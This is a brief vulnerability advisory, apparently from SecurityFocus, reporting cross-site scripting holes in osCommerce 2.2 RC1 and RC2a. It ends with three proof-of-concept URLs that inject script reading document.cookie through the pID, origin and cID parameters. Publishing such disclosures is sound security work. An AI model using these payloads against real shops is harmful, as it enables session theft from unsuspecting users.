@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/29055/info
+
+osCommerce is prone to multiple cross-site scripting vulnerabilities.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+osCommerce 2.2 RC1 and 2.2 RC2a are vulnerable; other versions may also be affected.
+
+http://www.example.com/[oscommerce]/categories.php?cPath=1_4&pID=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&action=new_product_preview&read=only http://www.example.com/[oscommerce]/categories.php?action=new_product_preview&read=only&pID=27&origin=stats_products_viewed.php?page=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E http://www.example.com/[oscommerce]/orders.php?cID=2%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
